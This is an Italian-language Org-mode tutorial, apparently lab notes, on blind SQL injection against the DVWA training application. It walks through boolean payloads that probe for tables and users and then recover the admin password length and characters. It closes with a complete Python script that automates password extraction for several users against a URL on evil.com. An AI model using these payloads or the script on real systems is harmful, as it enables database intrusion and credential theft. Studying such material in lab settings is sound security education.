@@ -1,0 +1,209 @@
+#+TITLE: DVWA Blind SQLi Easy
+#+AUTHOR: Leonardo Tamiano
+
+* Introduzione
+   Per forzare condizione vera
+
+   #+begin_example
+1' AND 1=1 #    
+   #+end_example
+
+   Per forzare condizione falsa
+
+   #+begin_example
+1' AND 1=0 #    
+   #+end_example
+
+   --------------
+
+* Q1: esistenza tabelle
+
+ Per indovinare esistenza tabelle. Se risponde exists, allora la
+ tabella esiste, altrimenti la tabella non esiste.
+
+ #+begin_example
+1' AND (select 'x' from users LIMIT 1) = 'x' #
+1' AND (select 'x' from guestbook LIMIT 1) = 'x' #   
+ #+end_example
+
+ Da notare il guess sta dopo il from interno. 
+
+ #+begin_example
+   from users LIMIT 1 ---> sto testando il guess "esiste la tabella users?"
+   from guestbook LIMIT 1 ---> sto testando il guess "esiste la tabella guestbook?"   
+ #+end_example
+
+ L'idea è quella di codificare la domanda "esiste la tabella TABLE"?
+ nella seguente forma
+   
+ #+begin_example
+1' AND (select 'x' from <TABLE> LIMIT 1) = 'x' #   
+ #+end_example
+
+ --------------
+
+ Per indovinare nomi utenti nella tabella users.
+
+* Q2: utenti in tabella users
+  Il payload per verificare la presenza di un utente ~<USER>~ nella
+  tabella ~users~ è la seguente
+
+  #+begin_example
+    1' AND (select 'x' from users where first_name='<USER>' LIMIT 1) = 'x' #
+  #+end_example
+
+  Ad esempio:
+
+  - verificare presenza utente ~admin~ nella tabella ~users~
+
+    #+begin_example
+1' AND (select 'x' from users where first_name='admin' LIMIT 1) = 'x' #      
+    #+end_example
+
+  - verificare presenza utente ~asd~ nella tabella ~users~
+
+    #+begin_example
+1' AND (select 'x' from users where first_name='asd' LIMIT 1) = 'x' #      
+    #+end_example
+
+* Q3: Controllare lunghezza password utente admin nella tabella users
+  Per capire la lunghezza della password l'idea è di codificare una
+  serie di domande:
+
+  Q1) La lunghezza della password dell'utente admin nella tabella
+  users è > 1?
+
+  Q2) La lunghezza della password dell'utente admin nella tabella
+  users è > 2?
+
+  Q3) La lunghezza della password dell'utente admin nella tabella
+  users è > 3?
+
+  Quindi la domanda generale è la seguente
+
+  Qi) La lunghezza della password dell'utente admin nella tabella
+  users è > i?
+
+  Tale domanda può essere codificata nel seguente payload
+
+  #+begin_example
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > i LIMIT 1) = 'x' #     
+  #+end_example
+    
+  A questo punto l'idea è quella di inviare una serie di query
+
+  #+begin_example
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 1 LIMIT 1) = 'x' #
+
+
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 2 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 3 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 4 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 5 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 6 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 7 LIMIT 1) = 'x' #
+...
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 30 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 31 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 32 LIMIT 1) = 'x' #      
+  #+end_example
+
+  E alla fine scopro che la password dell'utente admin è proprio lunga 32.
+
+* Q4: Estrazione password admin nella tabella users
+  L'idea è sempre quella di codificare dentro SQL la seguente domanda
+
+  Q1) Il primo carattere della password dell'utente admin nella
+  tabella users è proprio 'a'?
+
+  Q2) Il primo carattere della password dell'utente admin nella
+  tabella users è proprio 'b'?
+
+  ...
+
+  Q3) Il primo carattere della password dell'utente admin nella
+  tabella users è proprio 'z'?
+
+  In generale mi possono chiedere se l'i-esimo carattere della
+  password di admin nella tabella users sia proprio il carattere <c>
+
+  Q) Il carattere i-esimo della password dell'utente admin nella
+  tabella users è proprio <c>?
+
+  Tale domanda può essere codificata nel seguente payload
+
+  #+begin_example
+1' AND (select 'x' from users where first_name='admin' and substring(password, i, 1) = <c> LIMIT 1) = 'x' #    
+  #+end_example
+
+  Per esempio possiamo scoprire che il primo carattere della
+  password di admin nella tabella users è il carattere '5' in quanto
+  il server risponde "user exists" con il seguente payload
+    
+  #+begin_example
+1' AND (select 'x' from users where first_name='admin' and substring(password, 1, 1) = '5' LIMIT 1) = 'x' #        
+  #+end_example
+
+  Continuando, possiamo scoprire che il secondo carattere della
+  password di admin nella tabella users è il carattere 
+
+  #+begin_example
+1' AND (select 'x' from users where first_name='admin' and substring(password, 2, 1) = 'f' LIMIT 1) = 'x' #        
+  #+end_example
+
+  Ovviamente questo procedimento necessita di essere automatizzato.
+
+* Codice python
+  Le domande di prima, e in particolare il processo di calcolo della
+  lunghezza della password e dell'estrazione della password possono
+  essere automatizzati come segue
+
+  #+begin_src python
+#!/usr/bin/env python3
+
+import requests
+
+URL = "http://evil.com/dvwa/vulnerabilities/sqli_blind/"
+
+CUSTOM_HEADERS = {
+    "Cookie": "security=low; PHPSESSID=e8hut8pjnkk4ps2b42bce1ubrl"
+}
+
+MAX_PASSWORD_LENGTH = 1024
+ALPHABET = "-_" + "0123456789" + "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+def get_password_length(username):
+    global URL, CUSTOM_HEADERS, MAX_PASSWORD_LENGTH
+    for i in range(1, MAX_PASSWORD_LENGTH):
+        sqli_payload = f"1' AND (select 'x' from users where first_name='{username}' and LENGTH(password) > {i} LIMIT 1) = 'x' # "
+        params = {"id": sqli_payload, "Submit": "Submit" }
+        r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
+        if "MISSING" in r.text:
+            return i
+
+def get_password(username):
+    global URL, CUSTOM_HEADERS, ALPHABET 
+    
+    password_length = get_password_length(username)
+    password = ""
+    print(f"[{username}]: La lunghezza della password è {password_length}")
+
+    for i in range(1, password_length + 1):
+        for c in ALPHABET:
+            sqli_payload = f"1' AND (select 'x' from users where first_name='{username}' and substring(password, {i}, 1) = '{c}' LIMIT 1) = 'x' # "
+            params = {"id": sqli_payload, "Submit": "Submit" }
+            r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
+            if "exists" in r.text:
+                password = password + c
+                print(c, end="", flush=True)
+                break
+    print()
+    return password
+
+if __name__ == "__main__":
+    users = ["admin", "Bob", "Pablo", "Gordon"]
+    for user in users:
+        password = get_password(user)
+        print(f"L'utente {user} ha la password: {password}")    
+  #+end_src
+
